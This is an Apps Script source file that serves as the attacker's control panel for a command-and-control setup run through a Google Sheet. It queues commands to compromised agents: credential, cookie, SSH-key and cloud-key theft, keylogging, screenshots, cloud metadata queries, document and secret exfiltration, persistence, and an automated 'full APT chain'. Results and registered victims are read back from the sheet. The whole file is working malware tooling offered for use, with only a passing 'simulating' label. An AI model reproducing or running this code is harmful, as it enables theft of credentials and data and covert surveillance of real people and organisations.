/**
 * queue_command.gs — Attacker-side command injection via Sheets API
 * ==================================================================
 * This script is run by the ATTACKER (from their own machine / Apps Script project)
 * to write commands into the C2 Google Sheet, simulating the attacker control surface.
 *
 * In a real scenario the attacker could:
 *   (a) Edit the Sheet manually in the browser
 *   (b) Use the Sheets API with a service account
 *   (c) Use this helper script
 */

// ─── CONFIG ───────────────────────────────────────────────────────────────────

const ATK_CONFIG = {
  SHEET_ID:       "YOUR_SHEET_ID_HERE",
  COMMANDS_SHEET: "Commands",
};

// ─── QUEUE A COMMAND ──────────────────────────────────────────────────────────

/**
 * queueCommand — writes a command row to the Commands sheet.
 *
 * @param {string} target  — agent UUID or "*" for broadcast
 * @param {string} command — command string
 */
function queueCommand(target, command) {
  const ss    = SpreadsheetApp.openById(ATK_CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(ATK_CONFIG.COMMANDS_SHEET);

  const id = Date.now();
  sheet.appendRow([id, target, command, "pending", new Date().toISOString()]);

  Logger.log(`Queued [${id}] -> ${target}: ${command}`);
  return id;
}

// ─── DEMO SCENARIOS ───────────────────────────────────────────────────────────

/** Run this to send a broadcast recon sweep to all connected agents */
function demoReconSweep() {
  const commands = [
    "whoami",
    "sysinfo",
    "av",
    "netstat",
    "ipconfig",
    "users",
    "wifi",
    "creds",
    "history",
  ];

  commands.forEach(cmd => {
    queueCommand("*", cmd);
    Utilities.sleep(500); // Small delay to maintain ordering
  });

  Logger.log("Recon sweep queued for all agents.");
}

/** Send a targeted command to a specific agent */
function demoTargetedCommand() {
  const TARGET_AGENT = "REPLACE_WITH_AGENT_UUID";
  queueCommand(TARGET_AGENT, "browser-cookies");
}

/** Queue a keylogger activation */
function demoKeylogger() {
  queueCommand("*", "keylog start");
  Logger.log("Keylogger started on all agents. Run demoKeylogDump() after some time.");
}

function demoKeylogDump() {
  queueCommand("*", "keylog dump");
}

/** Fetch an internal resource via the agent's network context */
function demoInternalFetch() {
  queueCommand("*", "fetch-url http://169.254.169.254/latest/meta-data/"); // AWS IMDS example
}

// ─── SCENARIO TEMPLATES ───────────────────────────────────────────────────────

/**
 * Scenario 1 — Full Credential Sweep
 * Exfiltrates: Windows creds, WiFi, browser passwords + decryption keys,
 * browser cookies, SSH keys, cloud provider credentials, env secrets.
 * @param {string} target - agent UUID or "*" for broadcast
 */
function scenarioCreds(target = "*") {
  const commands = [
    "whoami", "sysinfo", "av",
    "creds",          // Windows Credential Manager
    "wifi",           // WiFi cleartext passwords
    "history",        // PS command history (often contains credentials)
    "cloud-keys",     // AWS / Azure / GCP / Docker / Kubernetes
    "ssh-keys",       // SSH private keys
    "browser-creds",  // Chrome/Edge Login Data + Local State (DPAPI key)
    "browser-cookies",// Chrome/Edge session cookies
    "env",            // Environment variables (tokens, API keys)
  ];
  commands.forEach(cmd => { queueCommand(target, cmd); Utilities.sleep(350); });
  Logger.log(`[SCENARIO 1] Credential sweep queued for ${target} (${commands.length} commands)`);
}

/**
 * Scenario 2 — Network & Active Directory Reconnaissance
 * Maps the network: IPs, ARP, DNS cache, shares, AD users/groups,
 * RDP sessions, firewall rules. Starts keylogger and takes screenshot.
 * @param {string} target - agent UUID or "*"
 */
function scenarioRecon(target = "*") {
  const commands = [
    "whoami", "sysinfo",
    "ipconfig", "netstat", "arp", "route", "dns-cache",
    "shares",          // SMB / Net shares
    "domain-info",     // AD domain, PDC, DCs
    "ldap-users",      // All AD users
    "ldap-groups",     // All AD groups
    "rdp-sessions",    // Active logon sessions
    "firewall",        // Enabled firewall rules
    "ps", "tasks", "users", "groups",
    "keylog start",    // Continuous keystroke collection
    "screenshot",      // Visual context
  ];
  commands.forEach(cmd => { queueCommand(target, cmd); Utilities.sleep(350); });
  Logger.log(`[SCENARIO 2] Network recon queued for ${target} (${commands.length} commands)`);
}

/**
 * Scenario 3 — Document & Intellectual Property Exfiltration
 * Finds Office/PDF documents, source code repos, and files containing
 * embedded secrets (passwords, API keys, connection strings).
 * @param {string} target - agent UUID or "*"
 */
function scenarioExfil(target = "*") {
  const commands = [
    "find-docs",     // PDF, DOCX, XLSX, PPTX, CSV in %USERPROFILE%
    "find-code",     // .py, .js, .cs, .go, .env, git repos, etc.
    "find-secrets",  // Grep files for API keys, tokens, passwords
  ];
  commands.forEach(cmd => { queueCommand(target, cmd); Utilities.sleep(350); });
  Logger.log(`[SCENARIO 3] Document hunt queued for ${target} (${commands.length} commands)`);
}

/**
 * Scenario 4 — Persistence + Lateral Movement Preparation
 * Installs persistence (survives reboots), starts background collectors,
 * and enumerates lateral movement targets.
 * @param {string} target - agent UUID or "*"
 */
function scenarioPersist(target = "*") {
  const commands = [
    "persist",            // Scheduled task (AtLogon) + HKCU Run key
    "keylog start",       // Continuous keystroke collection
    "clip-watch start",   // Clipboard monitoring
    "screenshot",         // Initial situational awareness
    "ldap-users",         // Enumerate lateral movement targets
    "shares",             // Accessible network shares
  ];
  commands.forEach(cmd => { queueCommand(target, cmd); Utilities.sleep(350); });
  Logger.log(`[SCENARIO 4] Persistence + lateral prep queued for ${target} (${commands.length} commands)`);
}

/**
 * Scenario 5 — Full APT Chain
 * Runs all four scenarios in sequence. ~35+ commands queued automatically.
 * Represents a complete initial compromise: recon + credentials + documents + persistence.
 * @param {string} target - agent UUID or "*"
 */
function scenarioFullAPT(target = "*") {
  scenarioCreds(target);
  Utilities.sleep(2000);
  scenarioRecon(target);
  Utilities.sleep(2000);
  scenarioExfil(target);
  Utilities.sleep(2000);
  scenarioPersist(target);
  Logger.log(`[SCENARIO 5] Full APT chain queued for ${target}`);
}

// ─── READ RESULTS ─────────────────────────────────────────────────────────────

/** Print all results to the Apps Script log */
function dumpResults() {
  const ss    = SpreadsheetApp.openById(ATK_CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName("Results");
  const rows  = sheet.getDataRange().getValues();

  rows.slice(1).forEach(([ts, agent, cmd_id, output]) => {
    Logger.log(`[${ts}] Agent=${agent} Cmd=${cmd_id}\n${output}\n---`);
  });
}

/** Print all registered agents */
function listAgents() {
  const ss    = SpreadsheetApp.openById(ATK_CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName("Agents");
  const rows  = sheet.getDataRange().getValues();

  Logger.log("=== REGISTERED AGENTS ===");
  rows.slice(1).forEach(([id, registered, last_seen, meta, status]) => {
    Logger.log(`ID: ${id}\n  Registered: ${registered}\n  Last seen: ${last_seen}\n  Status: ${status}\n  Meta: ${meta}\n`);
  });
}
